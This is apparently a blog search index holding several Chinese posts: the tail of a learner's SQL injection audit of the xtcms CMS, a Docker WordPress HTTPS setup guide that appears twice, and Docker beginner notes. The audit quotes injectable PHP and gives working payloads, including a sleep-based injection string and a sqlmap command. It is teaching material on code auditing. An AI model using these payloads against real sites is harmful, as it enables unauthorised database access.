'.$_GET['id'].'');\n\n\nadmin/cms_user.php&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\nerror_reporting(0);\ninclude('model/user.php');\n?>\nif (isset($_GET['key'])) &#123;\n$sql = 'select * from xtcms_user where u_name like \"%'.$_GET['key'].'%\" order by u_id desc';\n$pager = page_handle('page',20,mysql_num_rows(mysql_query($sql)));\n$result = mysql_query($sql.' limit '.$pager[0].','.$pager[1].'');\n&#125;\n这里的话参数是在like处，这里的话经过本地测试及查找资料并未发现此处可以进行SQL注入，通过SQLmap扫描也无果，各位大师傅如果有思路的话还请指点一二\nadmin/cms_detail.phpif (isset($_GET['cid'])) &#123;\n\tif ($_GET['cid'] != 0)&#123;\n\t\t$sql = 'select * from xtcms_vod where d_parent in ('.$_GET['cid'].') order by d_id desc';\n\t\t$pager = page_handle('page',20,mysql_num_rows(mysql_query($sql)));\n\t\t$result = mysql_query($sql.' limit '.$pager[0].','.$pager[1].'');\n\t&#125;else&#123;\n\t\t$sql = 'select * from xtcms_vod order by d_id desc';\n\t\t$pager = page_handle('page',20,mysql_num_rows(mysql_query($sql)));\n\t\t$result = mysql_query($sql.' limit '.$pager[0].','.$pager[1].'');\n\t\t&#125;\n&#125;\n这里的话关注这里\n$sql = 'select * from xtcms_vod where d_parent in ('.$_GET['cid'].') order by d_id desc';\n这个cid参数是被括号包裹的，这里我们可以尝试通过使用这种payload来进行闭合语句从而进行SQL注入\ncid=1) and sleep(1) --+\n//此时语句$sql = 'select * from xtcms_vod where d_parent in (1) and sleep(5)\n根据回显时间可以看出此处是存在SQL注入的\nadmin/cms_kamilist.php&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\nerror_reporting(0);\n\n?>\nif (isset($_GET['c_used'])) &#123;\n\t$sql = 'select * from xtcms_user_card where c_used=\"'.$_GET['c_used'].'\" order by c_id desc';\n\t$pager = page_handle('page',20,mysql_num_rows(mysql_query($sql)));\n\t$result = mysql_query($sql.' limit '.$pager[0].','.$pager[1].'');\n&#125;\n这里的话可以看出参数被双引号包裹了，开头包含了SQL防护文件，涉及了addslashes()函数，所以这里自认为是不存在SQL注入的，找下一处。\nucenter/index.php//部分\n&lt;?php include('../system/inc.php');\nif(!isset($_SESSION['user_name']))&#123;\n\t\talert_href('请登陆后进入','login.php');\n&#125;;\n?>\n&lt;?php include('left.php');?>\n&lt;?php\n$result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');\nif($row = mysql_fetch_array($result))&#123;\n?>\n这里的话可以看见参数是SESSION传参，不同于之前的GET和POST，而且这里还有双引号包裹，因此这里不存在SQL注入，下一处类似这种的还有\nucenter/kami.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');\n\nucenter/chongzhi.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');\n\nucenter/mingxi.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');\n\nucenter/cms_user_add.php源码为\n&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\n\nif ( isset($_POST['save']) ) &#123;\nnull_back($_POST['u_name'],'请填写登录帐号');\n\tnull_back($_POST['u_password'],'请填写登录密码');\n$result = mysql_query('select * from xtcms_user where u_name = \"'.$_POST['u_name'].'\"');\n\tif(mysql_fetch_array($result))&#123;\n\t\talert_back('帐号重复，请输入新的帐号。');\n\t&#125;\n双引号包裹，且包含了过滤函数，因此SQL注入不存在，误报，类似这种的还有\nucenter/return_url.php\n其SQL语句如下\n$order = mysql_query('select * from xtcms_user_pay where p_order=\"'.$out_trade_no.'\"');\n\nucenter/password.php\n其SQL语句如下\n$sql = 'select * from xtcms_user where u_name = \"'.$u_name.'\" and u_password = \"'.md5($u_password).'\" and u_status=1';\n\nucenter/reg.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_user where u_email = \"'.$_POST['email'].'\"');\n\nucenter/login.php\n其SQL语句如下\n$sql = 'select * from xtcms_user where u_name = \"'.$u_name.'\" and u_password = \"'.md5($u_password).'\" and u_status=1';\n\nucenter/mingxi.php\n其SQL语句如下\n$card= mysql_query('select * from xtcms_userka where id=\"'.$_POST['cardid'].'\"');\nucenter/repass.php源码为\n&lt;?php \ninclude('../system/inc.php');\nif(isset($_SESSION['user_name']))&#123;\nheader('location:index.php');\n&#125;;\n\t\nif(isset($_POST['submit']))&#123;\n$username = stripslashes(trim($_POST['name']));\n$email = trim($_POST['email']);\n// 检测用户名是否存在\n$query = mysql_query(\"select u_id from xtcms_user where u_name='$username' and u_email='$email'\");\nif(!! $row = mysql_fetch_array($query))&#123;\n$_data['u_password'] = md5(123456);\n$sql = 'update xtcms_user set '.arrtoupdate($_data).' where u_name=\"'.$username.'\"';\nif (mysql_query($sql)) &#123;\n这里的话我们看到参数name\n$username = stripslashes(trim($_POST['name']));\n这里引用了stripslashes函数，而文件开头又包含inc.php，这个文件里包含了addslashes函数，当我们参数出现单引号这种特殊字符时，addslashes会加上反引号，而stripslashes会清除addslashes函数加上的反引号，这个时候就相当于没有防护一样，所以显而易见这里是存在SQL注入的，我们可以使用bp抓包保存后，再利用sqlmap来得到数据库信息，具体payload\npython sqlmap.py -r \"D:\\sqlmap\\3.txt\" -p name --dbs\n但很怪，我自己的没有跑出来数据而我参考其他师傅的文章后发现他们的可以跑出来。payload如下\nname=1' AND (SELECT 3775 FROM (SELECT(SLEEP(5)))OXGU) AND 'XUOn'='XUOn&amp;email=1@qq.com&amp;password=111&amp;submit=\n类似这种的还有\nucenter/active.php\n其SQL语句如下\n$verify = stripslashes(trim($_GET['verify']));\n$nowtime = time();\n$query = mysql_query(\"select u_id from xtcms_user where u_question='$verify'\");\n\nucenter/reg.php\n其内SQL语句如下\nif(isset($_POST['submit']))&#123;\n$username = stripslashes(trim($_POST['name']));\n$query = mysql_query(\"select u_id from xtcms_user where u_name='$username'\");\n\n总结本次CMS审计花费了很多时间,一方面因为漏洞点有点多，另一方面也是初学代码审计，不太擅长，经过此次审计后对SQL注入和XSS漏洞有了进一步的了解，也学到了新的思路和知识。也希望此文章能对在学习代码审计的师傅有一些帮助。\n参考文献https://xz.aliyun.com/t/7711https://xz.aliyun.com/t/11322#toc-2\n","slug":"记一次较为详细的某CMS代码审计","date":"2022-06-08T09:35:30.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"quan9i"},{"id":"d6ca6f4d3d89a2aaf340b7664d7ca172","title":"docker搭建的wordpress博客http转换https","content":"前言由于http显示的不安全让我感觉很不好，所以百度了一下，添加了SSL证书，而后成功转换成了https，过程记录如下，希望对师傅们有所帮助。\n端口第一个我们需要注意的事情就是我们是否开启了443端口，我们的服务器是否开了端口\n\n而后呢，我们需要查看我们的wordpress是否开启了443映射端口，可以用以下命令来查看\ndocker ps\n\n\n可以看见我这个之前并未设置443端口，443端口对应的是https服务，因此我们首先需要打开这个https服务，修改映射端口有两种方法，一种是复制镜像，然后再开一次，但是这种的话我们是连接了mysql数据库的，那它就重置了，就需要重新设置\n\n因此我们这里选择另一个方法，就是直接修改代码来添加映射端口，步骤如下\n首先找一下容器对应的id\ndocker inspect wordpress|grep Id\n   \n\n\n然后此时我们切换到/var/lib/docker/containers路径下，镜像在这个文件夹下\n\n此时我们还需要关闭一下我们的docker容器并关闭docker\ndocker stop 3f6c5d4929570921d7ea3f3df0b965148ff17355db465a140fd18a6b3e59bb7b\n//关闭wordpress容器\ndocker stop  66308fc65ccf\n//关闭mysql容器\nsystemctl stop docker\n\n然后进入我们对应容器的文件夹下,编辑hostconfig.json文件\ncd 3f6c5d4929570921d7ea3f3df0b965148ff17355db465a140fd18a6b3e59bb7b\nvim  hostconfig.json\n\n\n进入后在PortBandings后加上&quot;443/tcp&quot;: [&#123;&quot;HostIp&quot;: &quot;&quot;,&quot;HostPort&quot;: &quot;443&quot;&#125;]\n\n然后保存并退出\n再编辑config.v2.json文件\n进入后在ExposedPorts中加上&quot;443/tcp&quot;:&#123;&#125;\n\n保存并退出\n然后再打开docker并开启容器即可\nsystemctl start docker\ndocker start 容器id\n\n此时再docker ps，就可以看见映射端口有443了\n\n设置端口的工作就完成了\n申请并上传SSL证书我用的服务器是腾讯云的，然后在服务器里添加上自己的域名后，搜索SSL证书就会出现申请免费证书的，我们申请一下，一般几分钟就好了\n\n而后下载证书，将zip文件解压，将里面的key和pem后缀的上传到服务器，就是下图的后面两个文件\n\n先上传到服务器上，我用的是finalshell，其他应该都差不多，直接拖文件到里面就可以\n\n此时有一个问题，就是如何将文件上传到docker容器里，经过百度后发现命令如下\ndocker cp 服务器路径 容器id:容器路径\n\n那我这里的话就是\ndocker cp &#x2F;tmp&#x2F;www.quan9i.top.key  3f6c5d492957:&#x2F;etc&#x2F;ssl\n\n另一个同理\n加载模块及修改文件此时准备工作完成，我们进入wordpress容器\ndocekr exec -it 容器id &#x2F;bin&#x2F;bash\n\n首先我们需要加载一下openssl模块，输入如下指令\nopenssl\n&#x2F;&#x2F;此时如果如下图，说明已经安装过了，输入exit退出即可\n\n\n此时需要再加载 apache SSL 模块，指令如下\na2enmod ssl\n&#x2F;&#x2F;第一次的话会要求重启Apache服务，此时我们退出容器重启一下即可\n\n\nApache 加载 SSL 模块后，会在 /etc/apache2/sites-available 下生成 default-ssl.conf 文件，因此我们此时就去编辑这个文件\nvim  &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default-ssl.conf\nSSLCertificateFile\t&#x2F;etc&#x2F;ssl&#x2F;www.quan9i.top.pem\n&#x2F;&#x2F;这个路径是自己设置的，我们前面服务器上传文件上传到了容器的这个文件夹下\nSSLCertificateKeyFile &#x2F;etc&#x2F;ssl&#x2F;www.quan9i.top.key\n\n\n此时修改完成，保存退出即可\n此时还需要让ssl被apache加载，指令如下\nln -s &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default-ssl.conf &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;default-ssl.conf\n\n此时还需要设置一下强制http转https，指令如下\nvim &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf\n\n在&lt;VirtualHost *:80&gt; &lt;/VirtualHost&gt;标签下添加如下内容\n&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&quot;&gt; \n    RewriteEngine   on\n    RewriteBase &#x2F;\n    # FORCE HTTPS\n    RewriteCond %&#123;HTTPS&#125; !&#x3D;on\n    RewriteRule ^&#x2F;?(.*) https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;&#x2F;$1 [R,L]\n&lt;&#x2F;Directory&gt;\n\n\n此时就可以实现强制http转https，退出容器，重启一下wordpress即可\ndocker restart wordpress\n\n\n发现可以了，但是我们还需要做最后一步，就是修改wordpress里的url地址，在设置的常规里修改一下即可\n\n此时就实现了http转https\n尾记博主只是小白，可能在某方面会出现部分问题，还请各位师傅多多指教。\n参考文章https://blog.csdn.net/wkh___/article/details/114879500\nhttps://www.jianshu.com/p/e8ae8bb1ad0a\nhttps://blog.csdn.net/u012577474/article/details/109702141\n","slug":"docker搭建的博客HTTP转HTTPS","date":"2022-05-18T03:56:30.000Z","categories_index":"博客","tags_index":"博客搭建","author_index":"quan9i"},{"id":"a45f7c773a3149d4d0d45e9d198b7bbc","title":"服务器+docker搭建wordpress博客","content":"前言由于http显示的不安全让我感觉很不好，所以百度了一下，添加了SSL证书，而后成功转换成了https，过程记录如下，希望对师傅们有所帮助。\n端口第一个我们需要注意的事情就是我们是否开启了443端口，我们的服务器是否开了端口\n\n而后呢，我们需要查看我们的wordpress是否开启了443映射端口，可以用以下命令来查看\ndocker ps\n\n\n可以看见我这个之前并未设置443端口，443端口对应的是https服务，因此我们首先需要打开这个https服务，修改映射端口有两种方法，一种是复制镜像，然后再开一次，但是这种的话我们是连接了mysql数据库的，那它就重置了，就需要重新设置\n\n因此我们这里选择另一个方法，就是直接修改代码来添加映射端口，步骤如下\n首先找一下容器对应的id\ndocker inspect wordpress|grep Id\n   \n\n\n然后此时我们切换到/var/lib/docker/containers路径下，镜像在这个文件夹下\n\n此时我们还需要关闭一下我们的docker容器并关闭docker\ndocker stop 3f6c5d4929570921d7ea3f3df0b965148ff17355db465a140fd18a6b3e59bb7b\n//关闭wordpress容器\ndocker stop  66308fc65ccf\n//关闭mysql容器\nsystemctl stop docker\n\n然后进入我们对应容器的文件夹下,编辑hostconfig.json文件\ncd 3f6c5d4929570921d7ea3f3df0b965148ff17355db465a140fd18a6b3e59bb7b\nvim  hostconfig.json\n\n\n进入后在PortBandings后加上&quot;443/tcp&quot;: [&#123;&quot;HostIp&quot;: &quot;&quot;,&quot;HostPort&quot;: &quot;443&quot;&#125;]\n\n然后保存并退出\n再编辑config.v2.json文件\n进入后在ExposedPorts中加上&quot;443/tcp&quot;:&#123;&#125;\n\n保存并退出\n然后再打开docker并开启容器即可\nsystemctl start docker\ndocker start 容器id\n\n此时再docker ps，就可以看见映射端口有443了\n\n设置端口的工作就完成了\n申请并上传SSL证书我用的服务器是腾讯云的，然后在服务器里添加上自己的域名后，搜索SSL证书就会出现申请免费证书的，我们申请一下，一般几分钟就好了\n\n而后下载证书，将zip文件解压，将里面的key和pem后缀的上传到服务器，就是下图的后面两个文件\n\n先上传到服务器上，我用的是finalshell，其他应该都差不多，直接拖文件到里面就可以\n\n此时有一个问题，就是如何将文件上传到docker容器里，经过百度后发现命令如下\ndocker cp 服务器路径 容器id:容器路径\n\n那我这里的话就是\ndocker cp &#x2F;tmp&#x2F;www.quan9i.top.key  3f6c5d492957:&#x2F;etc&#x2F;ssl\n\n另一个同理\n加载模块及修改文件此时准备工作完成，我们进入wordpress容器\ndocekr exec -it 容器id &#x2F;bin&#x2F;bash\n\n首先我们需要加载一下openssl模块，输入如下指令\nopenssl\n&#x2F;&#x2F;此时如果如下图，说明已经安装过了，输入exit退出即可\n\n\n此时需要再加载 apache SSL 模块，指令如下\na2enmod ssl\n&#x2F;&#x2F;第一次的话会要求重启Apache服务，此时我们退出容器重启一下即可\n\n\nApache 加载 SSL 模块后，会在 /etc/apache2/sites-available 下生成 default-ssl.conf 文件，因此我们此时就去编辑这个文件\nvim  &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default-ssl.conf\nSSLCertificateFile\t&#x2F;etc&#x2F;ssl&#x2F;www.quan9i.top.pem\n&#x2F;&#x2F;这个路径是自己设置的，我们前面服务器上传文件上传到了容器的这个文件夹下\nSSLCertificateKeyFile &#x2F;etc&#x2F;ssl&#x2F;www.quan9i.top.key\n\n\n此时修改完成，保存退出即可\n此时还需要让ssl被apache加载，指令如下\nln -s &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default-ssl.conf &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;default-ssl.conf\n\n此时还需要设置一下强制http转https，指令如下\nvim &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf\n\n在&lt;VirtualHost *:80&gt; &lt;/VirtualHost&gt;标签下添加如下内容\n&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&quot;&gt; \n    RewriteEngine   on\n    RewriteBase &#x2F;\n    # FORCE HTTPS\n    RewriteCond %&#123;HTTPS&#125; !&#x3D;on\n    RewriteRule ^&#x2F;?(.*) https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;&#x2F;$1 [R,L]\n&lt;&#x2F;Directory&gt;\n\n\n此时就可以实现强制http转https，退出容器，重启一下wordpress即可\ndocker restart wordpress\n\n\n发现可以了，但是我们还需要做最后一步，就是修改wordpress里的url地址，在设置的常规里修改一下即可\n\n此时就实现了http转https\n尾记博主只是小白，可能在某方面会出现部分问题，还请各位师傅多多指教。\n参考文章https://blog.csdn.net/wkh___/article/details/114879500\nhttps://www.jianshu.com/p/e8ae8bb1ad0a\nhttps://blog.csdn.net/u012577474/article/details/109702141\n","slug":"服务器+docker搭建wordpress博客","date":"2022-05-18T03:56:30.000Z","categories_index":"博客","tags_index":"博客搭建","author_index":"quan9i"},{"id":"36e3127158f57e60ea04c3497af98ec7","title":"docker初学小结","content":"基础概念百度：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。教程：docker：解决了运行环境和配置问题软件容器，方便做持续集成化并有助于整体发布的容器虚拟化技术小白理解：将全部内容(运行文档，配置环境，运行环境等等)打包到一起，构成一个镜像文件，这样的话从一台计算机移到另一台计算机几乎不会出现问题\n理念docker实现”一次封装，到处运行”，docker是基于Go语言实现的云开源项目三要素：镜像，容器，仓库对于镜像的理解：对于容器的理解：一个容器可以运行一种服务，当需要用到时，用docker创建一个运行实例，这就是容器，可以把容器看成一个简易版的linux环境对于仓库的理解：就是一堆镜像存放的地方，我们可以把镜像发布到仓库中，用的时候拉下来即可。\n同虚拟机的区别（1）虚拟机需要软件和硬件，而docker无需硬件，大大节省了空间（2）虚拟机需要重新加载系统内核，docker与宿主机共用一个操作系统\n运用输出helloworld镜像语句\ndocker run hello-world\n\n\n配置加速器由于docker是外国的，下载时比较慢，我们需要借助国内的镜像来下载其他插件，这样比较迅速省时，具体操作如下进入docker目录下查看是否存在daemon.json文件我的之前没有，是自己创建的文件，语句为\ntouch /etc/docker/daemon.json\n\n然后以vim编辑文件，语句为\nvim daemon.json\n\n进入后输入i进入编辑模式，输入以下内容\n&#123;\n  \"registry-mirrors\": [\n    \"https://hub-mirror.c.163.com\",\n    \"https://mirror.baidubce.com\"\n  ]\n&#125;\n然后按esc，输入:wq！（含义是保存并强制退出）此时再输入以下语句（重启服务）\n$ sudo systemctl daemon-reload\n$ sudo systemctl restart docker\n配置完毕\n帮助命令&lt;1&gt;显示版本信息\ndocker version\n&lt;2&gt;显示系统信息\ndocker info  \n&lt;3&gt;显示docker命令\ndocker --help\n\n镜像命令查看本机镜像docker images\nREPOSITORY：镜像的仓库源TAG：镜像的标签IMAGES ID：镜像IDCREATED： 镜像创建时间SIZE：镜像大小\n可选项\n-a 显示所有镜像 可以把镜像看成一个千层饼，上面的hello-world只是最外层\n-q 显示镜像id\n--digests 显示镜像的摘要信息（注释）\n --no-trunc 显示完整的镜像信息\n示例如下\ndocker images -aq\n\ndocker images --digests \n\ndocker images --digests --no-trunc \n\n搜索其他镜像docker search xxx(镜像名字)\n示例：\ndocker search tomcat\n常用可选项\n-s 列出收藏数不小于指定值的镜像\n--no-trunc 显示完整的镜像描述\n\n注：-s已弃用，移到–filter中使用 示例\ndocker search --filter stars=30 tomcat    \n\n下载镜像docker pull\n示例：\ndocker pull tomcat\n\n删除镜像docker rmi\n可选项\n-f //强制删除\n示例：\ndocker rmi hello-world\n删除多个时中间以空格分开即可，示例\ndocker rmi -f hello-world nginx\n删除全部的语句，示例\ndocker rmi -f$(docker images -qa)\n容器命令前提：有镜像有镜像才能创建容器，此为根本前提\n新建并启动容器docker run image\n常用项\n-i //以交互模式运行容器，通常与-t联用\n-t //为容器重新分配一个伪终端\n-d //以后台模式启动容器，不在界面显现\n-v // /宿主机目录:/容器目录\n--name=\"xxx\" //为容器指定名称为xxx\n示例1\ndocker run -it 5d0da3dc9764(centos镜像id)\n此时相当于在docker中进入到了centos的终端中。发现进入后的字符与镜像id不同，在root终端中查看当前容器，可以发现这个root后的字符是容器id示例2：\ndocker run -it  --name quan9i 5d0da3dc9764    \n查看当前容器，可以发现名字变为quan9i（不设置时系统自动随机生成）示例3\ndocker run -d centos \n\n此时查看当前容器，发现没有正在运行的容器，这是因为docker的机制是如果只有后台运行，没有前台进程，就会立即关闭那么该如何让它保存开启呢，具体示例如下\ndocker run -d centos /bin/sh -c \"while true;do echo hello quan9i;sleep 2;done\"\n\n\n查看日志docker logs 0cbe0a5786ad      \n\n常用可选项\n-t //添加时间戳\n-f //跟随最新的日志打印，即 及时更新\n--tail x //显示最后x条\n示例\ndocker logs -t -f --tail 6 0cbe0a5786ad  \n\nctrl+c即可退出\n查看容器内运行的进程docker top 容器id\n示例\ndocker top 0cbe0a5786ad\n\n之所以能这样使用是因为容器相当于linux的精简版，可以执行linux的部分命令\n查看容器内部细节docker inspect 容器id\n示例\ndocker inspect 0cbe0a5786ad\n\n进入正在运行的容器并以命令行交互语句1\ndocker exec -it 容器id bashshell\n语句2\ndocker attach 容器id //重新进入容器，适用于ctrl+p+q退出容器方式\n两个的区别在于（1）attach直接进入容器终端，不会启动新的进程（2）exec是在容器内打开新的终端，并且启动新的进程简单的说，exec可以得到输出结果并返回到当前界面，而attach是进入终端后再进行执行用成语讲：隔山打牛示例：\ndocker attach  cd10d1992eb4  \nls -l /tmp\n\ndocker exec -t cd10d1992eb4 ls -l /tmp  \n\n\n从容器内拷贝文件到主机语句\ndocker  cp 镜像id:容器内路径 目的主机路径\n示例\ndocker cp cd10d1992eb4: /tmp/yum.log /root       \n\n列出当前容器docker ps //默认显示当前正在运行的容器\n常用可选项\n-l //显示上一次的容器信息\n-a //显示之前全部的容器信息\n-n x //显示前x次的容器信息\n-q //只显示容器编号\n示例：\ndocker ps -a\n\ndocker ps -ql\n\n\n退出容器方式1\nexit  //退出并关闭容器\n方式2\nctrl+p+q //退出容器但不关闭容器\n示例\n\n启动容器docker start 容器id或容器名\n示例\ndocker start aad8f225fee0\n\n\n重启容器docker restart 容器id\n示例\ndocker restart 70d3b31e8fe3    \n可以发现时间由8分钟变成了4秒钟，说明重启成功\n停止容器方式1\ndocker stop 容器名\n方式2\ndocker kill 容器名\n方式1可以理解为电脑正常关机，而方式2可以理解为直接拔掉电源，比较迅速示例\ndocker stop aad8f225fee0\ndocker kill 70d3b31e8fe3\n\n\n删除已停止容器rmi为删除镜像，rm为删除容器方法一：注：法一已被弃用，执行无效\ndocker rm -f$(docker ps -a -q) \n方法二：\ndocker ps -a -q| xargs docker rm //删除全部镜像\n示例\ndocker镜像镜像是什么镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。\n（1）UnionFS（联合文件系统）：Union文件系统是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下，Union文件系统是Dokcer镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的镜像。\n特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统加载起来，这样最终的文件系统会包含所有的底层文件和目录\n（2）Docker镜像加载原理\ndocker的镜像实际上是由一层一层的文件系统构成，这种层级的文件系统UnionFS。\n主要包含bootloader和kernel，bootloader主要是引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的linux/unix系统是一样的，包含boot加载器内核。当boot加载完之后整个内核就都在内存中了，此时内存的使用权已经由bootfs交给内核了，此时系统也会卸载bootfs。\n对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就行，因为底层直接用host和kernel，自己只需要提供rootfs就行。由此可见对于不同的Linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。\n镜像采用了分层结构，采用这种结构最大的好处就是共享资源，举个例子，当下载一个插件时，他自己的缓存也存在于此，删除这个插件后，再下载这个插件或者需要用到支持此类资源的插件时，速度会快很多，这是因为共享一套底层资源(小白理解，有误轻喷)\n当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下都叫“镜像层”，例如下载的tomcat就是容器层\n镜像commit开启交互终端法一\ndocker run -it -it -p 8888:8080 tomcat //开放的端口是8888，映射到docker的8080端口\n执行结果法二\ndocker run  -it -P tomcat   (这里的p是大写)\n可以看见端口是49154访问与上相同\n开启副本\ndocker commit -a=\"作者信息\" -m=\"大致信息\"  容器id 版本号\n示例：\ndocker commit -a=\"zzyy\" -m=\"tomcat without docs\"  ca7c25a3947f atguigu/mytomcat:1.2 \n此副本与原先的区别在于没有doc\n容器数据卷概念Docker将运用与运行的环境打包形成容器运行， Docker容器产生的数据，如果不通过docker commit生成新的镜像，使得数据做为镜像的一部分保存下来， 那么当容器删除后，数据自然也就没有了。 为了能保存数据在Docker中我们使用卷。\n作用1、数据的持久化2、容器间继承+共享数据\n容器内添加直接命令添加docker run -it -v /宿主机绝对路径目录:/容器内目录 镜像名示例：\ndocker run -it -v  /myDataVolume: /dataVolumeContainer centos\n发现已经进入到了容器中此时打开另一个终端（此后称为host终端，第一个称为容器终端），输入ll查看数据卷是否写入可以发现中间已经存在了myDataVolume查看数据卷是否挂载成功\ndocker inspect 0e82da803fbc \n小知识，下图中的RW：true说明有写入的权限，即可读可写\n输入后发现binds后是我们刚刚写入的，说明挂载成功此时呢，我们在host终端创建文件然后去容器终端查看发现存在host.txtx文件，此时我们使用vi编辑host文件，在其内写入container updater 01 ，保存并退出，再创建一个新文件container.txt回到host终端查看发现写入成功，即说明容器和宿主机之间实现了数据共享此时回到容器终端，停止容器并退出回到host终端，在其内新建host02文件并更改host文件内容，内容更改为container update 01host update 01此时在回到容器终端，打开容器，查看文件内容发现改动了，说明容器停止退出后，主机修改后数据同步带权限的命令添加\ndocker run -it -v  /myDataVolume: /dataVolumeContainer ro centos\n其仅仅少了写入权限，即可以在host终端写入和编辑文件，而容器终端只有查看的权利，没有写入和编辑的权利\ndockerflie添加首先在根目录下新建mydocker文件并进入然后再使用vim创建并编辑Dockfile文件在里面写入如下内容\n# volume txt\nFROM centos\nVOLUME [\"/dataVolumeContainer1\",\"/dataVolumeContainer2\"] //添加两个数据卷\nCMD echo\"finished,------successs1\"  //\nCMD /bin/bash   \n上述内容其含义类似于\ndocker run -it -v /host1:/dataVolumeContainer1 -v/host2:/dataVolumeContainer2 centos /bin/bash\n\n知识小扩充：FROM：定制的镜像都是基于 FROM 的镜像，这里的 centos 就是定制需要的基础镜像。后续的操作都是基于 centos。CMD类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:\nCMD 在docker run 时运行。\nRUN 是在 docker build。\n\n 此时file搭建完毕，开始bulid生成镜像\ndocker bulid -f /mydocker/Dockerfile -t zzyy/centos . //.代表当前路径，也可填写其他\n此时查看容器镜像，可以看见镜像已经生成最后呢，进行run容器\ndocker run -it zzyy/centos\n此时查看目录发现两个数据卷已经成功写入那此时存在一个问题，就是数据卷的主机路径在哪里，我们重新打开一个终端，在终端下输入如下语句进行查看\ndocker inspect 容器id\n然后查找可以发现其路径，在Mounts的source中用dockerfile搭建数据卷完成\n数据容器卷概念：容器数据卷是指建立数据卷，来同步多个容器间的数据，实现容器间的数据同步。小白理解：建造一个容器作为父容器，其他容器同步于父容器，实现数据共享示例：首先创建一个父容器并创建doc1_add.txt文件\ndocker run -it --name doc1  zzyy/centos\n此时创建第二个容器\ndocker run -it --name dc02 --volumes-from doc1  zzyy/centos\n再进入到数据卷2下创建一个doc2_add.txt文件，此时查看目录可以发现父容器的数据也在此内（dco1_add.txt也写入到了其中）同理创建第三个并写入doc3_add.txt文件\ndocker run -it --name dc03 --volumes-from doc1  zzyy/centos \n\n\n再进入到父容器中，可以看见三个文件都存在，说明数据实现共享如果删除了父目录，那文件还会存在吗，接下来进行尝试\ndocker rmi -f 8925ea083cdf    \n进入第二个或者第三个容器\ndocker attach 5410be23987d\n\n可以发现文件仍然存在，因此只要容器没有删除完全，文件就不会消失。结论：容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器为止\ndocker file概念docker file是用来构建docker镜像的构建文件，是由一系列命令和参数构成的脚本\n三步骤编写dockerfile文件\ndocker bulid\ndocker run\ndockerfile 构建过程解析dockerfile内容基础知识1、每条指令都必须为大写字母且后面至少跟随一个参数\n2、代码从上至下，顺序执行\n3、#表示注释\n4、每条指令都会创建一个新的镜像层，并对镜像进行提交（千层饼，自下往上叠加）\n\ndockerfile执行大致流程1、docker从基础镜像运行一个容器\n2、执行一条语句并对容器做出修改\n3、执行类似docker commit的操作提交一个新的镜像层\n4、docker再基于刚提交的镜像运行一个容器\n5、执行dockerfile中的下一条指令直至所有指令都执行完成\ndockerfile保留字指令FROM xx //指出当前新镜像是基于哪个镜像的\nMAINTAINER xx //指出镜像维护者的名字和邮箱地址\nRUN xx //容器构建时需要执行的命令\nEXPOSE xx //当前容器对外暴露出的端口\nWORKDIR xx //指定在创建容器后，，终端默认登录的进来工作目录，一个落脚点\nENV xx //用在构建镜像过程中设置环境变量\nADD xx //将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包(拷贝加解压)\nCOPY xx //类似ADD，拷贝文件和目录到镜像中。\nVOLUME xx //容器数据卷，用于数据卷保存和持久化工作\nCMD xx //指定一个容器启动时要运行的命令，dockerfile中可有多条指令，但只有最后一个生效\nENTRYPOINT xx //指定一个容器时要运行的命令，和CMD一样，但在docker run后不会被替换\nONBULID xx //当构建一个被继承的dockerfile时运行命令，父镜像在被子镜像继承后其onbulid被触发\n可以参考一下Ubuntu的dockerfile\nFROM scratch\nADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz /\n\n# a few minor docker-specific tweaks\n# see https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap\nRUN set -xe \\\n\t\\\n# https://github.com/docker/docker/blob/9a9fc01af8fb5d98b8eec0740716226fadb3735c/contrib/mkimage/debootstrap#L40-L48\n\t&amp;&amp; echo '#!/bin/sh' > /usr/sbin/policy-rc.d \\\n\t&amp;&amp; echo 'exit 101' >> /usr/sbin/policy-rc.d \\\n\t&amp;&amp; chmod +x /usr/sbin/policy-rc.d 